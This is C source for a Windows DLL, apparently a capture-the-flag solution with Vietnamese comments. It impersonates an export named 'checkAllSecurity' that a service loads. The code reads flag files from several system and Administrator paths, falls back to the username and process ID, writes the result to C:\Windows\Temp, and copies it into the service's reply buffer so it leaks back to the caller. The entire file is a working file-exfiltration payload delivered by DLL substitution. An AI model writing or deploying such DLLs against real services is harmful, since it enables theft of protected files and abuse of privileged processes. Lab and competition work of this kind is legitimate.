#include <windows.h>
#include <stdio.h>
#include <string.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
    return TRUE;
}

__declspec(dllexport) BOOL __cdecl init(char* buf) {
    return TRUE;
}

static DWORD g_size;
static char g_data[4096];

__declspec(dllexport) DWORD* __cdecl checkAllSecurity(unsigned char* outbuf) {
    HANDLE hFile;
    DWORD written = 0;

    /* Thu tu cac duong dan flag co the co */
    const char* paths[] = {
        "C:\\flag.txt",
        "C:\\flag",
        "C:\\Users\\Administrator\\Desktop\\flag.txt",
        "C:\\Users\\kuvee\\Desktop\\flag.txt",
        "C:\\Program Files (x86)\\NGVONE\\Client\\flag.txt",
        "C:\\Windows\\flag.txt",
        NULL
    };

    memset(g_data, 0, sizeof(g_data));
    g_size = 0;

    for (int i = 0; paths[i] != NULL; i++) {
        hFile = CreateFileA(paths[i], GENERIC_READ, FILE_SHARE_READ,
                            NULL, OPEN_EXISTING, 0, NULL);
        if (hFile != INVALID_HANDLE_VALUE) {
            ReadFile(hFile, g_data, sizeof(g_data) - 1, &g_size, NULL);
            CloseHandle(hFile);
            if (g_size > 0) break;
        }
    }

    if (g_size == 0) {
        /* Fallback: lay thong tin he thong */
        char user[128] = "unknown";
        DWORD sz = sizeof(user);
        GetUserNameA(user, &sz);
        g_size = (DWORD)snprintf(g_data, sizeof(g_data),
            "NO_FLAG_FOUND | user=%s | pid=%lu", user, GetCurrentProcessId());
    }

    /* Ghi ra file backup (doc duoc du ket qua mang co loi) */
    hFile = CreateFileA("C:\\Windows\\Temp\\sv_flag_out.txt",
                        GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                        FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        WriteFile(hFile, g_data, g_size, &written, NULL);
        CloseHandle(hFile);
    }

    /* Copy vao outbuf (la v127 trong service) */
    if (outbuf)
        memcpy(outbuf, g_data, g_size + 1);

    /* Return pointer sao cho *ptr - 4 = length can gui */
    g_size += 4;
    return &g_size;
}
